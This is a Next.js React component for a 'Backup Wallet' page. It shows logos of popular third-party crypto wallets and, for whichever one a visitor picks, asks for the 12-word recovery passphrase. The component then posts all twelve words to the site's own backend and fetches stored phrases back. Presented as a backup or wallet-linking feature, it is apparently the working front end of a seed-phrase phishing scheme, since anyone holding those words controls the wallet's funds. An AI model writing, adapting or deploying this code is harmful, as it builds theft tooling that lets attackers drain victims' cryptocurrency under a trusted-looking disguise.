'use client';

import Image, { StaticImageData } from "next/image";
import '../../app/globals.css';
import { useEffect, useState } from "react";
import axios, { AxiosError } from "axios";
import apiClient from "@/lib/axios-config";
import Footer1 from "@/components/footers/Footer1";
import { toast } from "react-toastify";
import ArculusLogo from '../../assets/ArculusLogo.jpg'

interface CryptoService {
    name: string;
    logo: string | StaticImageData;
}

const cryptoServices: CryptoService[] = [
    { name: "Trust Wallet", logo: 'https://s3.coinmarketcap.com/static-gravity/image/bdb7a8c7bb114e8aa29f8b6fee2e7a41.png' },
    { name: "Lobstr", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxZO-w6G9AhJ0wp-OJ0-JSCnTg-VkTBLvRTw&s' },
    { name: "Exodus", logo: 'https://www.bestcrypto-wallet.com/wp-content/uploads/2025/04/exodus-logo.jpg' },
    { name: "Atomic", logo: 'https://atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded_2.png' },
    { name: "Meta Mask", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3ymr3UNKopfI0NmUY95Dr-0589vG-91KuAA&s' },
    { name: "Crypto.com | Defi wallet", logo: 'https://play-lh.googleusercontent.com/BoiXD2RIG2Bk-xsz4jhlmTznlAPgOAsJhtbi4mbApNX1oGJiSPlhmRkM7T-i9CaBX_E' },
    { name: "Pillar", logo: 'https://play-lh.googleusercontent.com/9nnmrnE-K2Aez5gY_vco8wfQaYxBPjOdUoInE7LlG-gyNsfN6zYOa0UKEj9UvxcLiBp4=w240-h480-rw' },
    { name: "BiyPay", logo: 'https://pbs.twimg.com/profile_images/750715284298862596/hgLKxRsO_400x400.jpg' },
    { name: "Arculus wallet", logo: ArculusLogo },
];

export default function BackupWallet() {
    const [selectedWallet, setSelectedWallet] = useState<CryptoService | null>(null);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [words, setWords] = useState<string[]>(Array(12).fill(""));
    const [filledWallets, setFilledWallets] = useState<string[]>([]);
    const [walletData, setWalletData] = useState<any[]>([]);

    useEffect(() => {
        const fetchWallets = async () => {
            try {
                const res = await apiClient.get('/api/history/get_word', {
                    headers: {
                        Authorization: `Bearer ${localStorage.getItem("token")}`
                    }
                });

                if (res.data.status_code && res.data.wallets?.length) {
                    setWalletData(res.data.wallets);
                    const walletsWithAllWords = res.data.wallets
                        .filter((w: any) => w.mnemonic?.trim().split(/\s+/).length === 12)
                        .map((w: any) => w.type);

                    setFilledWallets(walletsWithAllWords);
                }
            } catch (err) {
                const error = err as AxiosError<{ msg: string }>;
                console.log("error fetching wallets:", error);
            }
        };
        fetchWallets();
    }, []);

    const openModal = (wallet: CryptoService) => {
        setSelectedWallet(wallet);
        setIsModalOpen(true);

        const savedWallet = walletData.find(
            (w: any) => w.type.trim().toLowerCase() === wallet.name.trim().toLowerCase()
        );

        if (savedWallet?.mnemonic) {
            const mnemonicWords = savedWallet.mnemonic.trim().split(/\s+/);
            const limitedWords = mnemonicWords.slice(0, 12);
            setWords([
                ...limitedWords,
                ...Array(Math.max(0, 12 - limitedWords.length)).fill("")
            ]);
        } else {
            setWords(Array(12).fill(""));
        }
    };


    const closeModal = () => {
        setIsModalOpen(false);
        setSelectedWallet(null);
        setWords(Array(12).fill(""));
    };

    const handleWordChange = (index: number, value: string) => {
        const updated = [...words];
        updated[index] = value;
        setWords(updated);
    };

    const handleSubmit = async () => {
        if (words.some(word => word.trim() === "")) {
            // alert("fill all 12 words.");
            toast.error('Fill all 12 words.');
            return;
        }

        if (!selectedWallet) return;

        try {
            const payload = {
                type: selectedWallet.name,
                one: words[0],
                two: words[1],
                three: words[2],
                four: words[3],
                five: words[4],
                six: words[5],
                seven: words[6],
                eight: words[7],
                nine: words[8],
                ten: words[9],
                eleven: words[10],
                twelve: words[11]
            };

            const res = await apiClient.post('/api/history/add_word', payload);

            if (res.data.status_code) {
                // alert("✅ Wallet words saved successfully");
                toast.success('Wallet words saved successfully');
                closeModal();
                const refreshed = await apiClient.get('/api/history/get_word', {
                    headers: {
                        Authorization: `Bearer ${localStorage.getItem("token")}`
                    }
                });
                setWalletData(refreshed.data.wallets);
                const walletsWithAllWords = refreshed.data.wallets
                    .filter((w: any) => w.mnemonic?.trim().split(/\s+/).length === 12)
                    .map((w: any) => w.type);
                setFilledWallets(walletsWithAllWords);
            }
        } catch (err) {
            const error = err as AxiosError<{ msg: string }>;
            console.log(error.response?.data?.msg || "❌ Something went wrong.");
        }
    };

    return (
        <>
        <div className="tw-bg-[#11150f] tw-text-white tw-px-6 tw-pt-8 tf-container">
            <h2 className="tw-text-lg tw-font-semibold tw-mb-8">Backup Wallet</h2>
            <div className="tw-grid tw-grid-cols-1 sm:tw-grid-cols-2 lg:tw-grid-cols-4 tw-gap-[20px]">
                {cryptoServices.map((service) => (
                    <div
                        key={service.name}
                        onClick={() => openModal(service)}
                        className={`tw-flex tw-items-center tw-gap-4 tw-bg-black/20 tw-rounded-lg tw-px-3 tw-py-3 tw-transition tw-border-2 tw-border-solid
                            ${filledWallets.includes(service.name) ? "!tw-border-[#008000]" : "tw-border-[#f1f1f2]"} 
                            tw-cursor-pointer tw-hover:tw-bg-black/40`}
                    >
                        <div className="tw-w-12 tw-h-12 tw-relative tw-rounded-lg tw-overflow-hidden tw-mr-[12px]">
                            <Image
                                src={service.logo}
                                alt={service.name}
                                fill
                                className="tw-object-cover"
                            />
                        </div>
                        <div>
                            <h3 className="tw-text-lg">{service.name}</h3>
                        </div>
                    </div>
                ))}
            </div>
            {isModalOpen && selectedWallet && (
                <div className="tw-fixed tw-inset-0 tw-z-50 tw-bg-black tw-bg-opacity-70 tw-flex tw-justify-center tw-items-center">
                    <div className="tw-bg-[#1a1a1a] tw-rounded-lg tw-w-[90%] tw-max-w-md tw-p-8 tw-relative tw-text-white">
                        <button onClick={closeModal} className="tw-absolute tw-top-4 tw-right-6 tw-text-xl tw-border-none tw-w-0">×</button>
                        <div className="tw-flex tw-items-center tw-gap-[12px] tw-mb-4">
                            <div className="tw-w-10 tw-h-10 tw-relative tw-rounded-lg tw-overflow-hidden">
                                <Image
                                    src={selectedWallet.logo}
                                    alt={selectedWallet.name}
                                    fill
                                    className="tw-object-cover"
                                />
                            </div>
                            <h2 className="tw-text-xl tw-font-bold">{selectedWallet.name}</h2>
                        </div>
                        <hr className="tw-my-4" />
                        <p className="tw-mb-[20px] tw-text-center tw-text-[16px]">Enter your 12-word passphrase:</p>
                        <div className="tw-grid tw-grid-cols-2 tw-gap-[10px] tw-mb-[16px] tw-text-[13px]">
                            {words.map((word, i) => (
                                <input
                                    key={i}
                                    type="text"
                                    placeholder={`Word ${i + 1}`}
                                    value={word}
                                    onChange={(e) => handleWordChange(i, e.target.value)}
                                    className="tw-bg-[#333] tw-p-2 tw-rounded tw-text-white tw-border-2 tw-border-solid tw-border-gray-600 tw-outline-none tw-placeholder:tw-text-[13px]"
                                />
                            ))}
                        </div>
                        <button
                            onClick={handleSubmit}
                            className="tw-bg-green-600 tw-hover:tw-bg-green-700 tw-text-white tw-py-2 tw-px-4 tw-rounded tw-w-full tw-text-[16px]"
                        >
                            Link Wallet
                        </button>
                    </div>
                </div>
            )}
        </div>
        <Footer1/>
        </>
    );
}
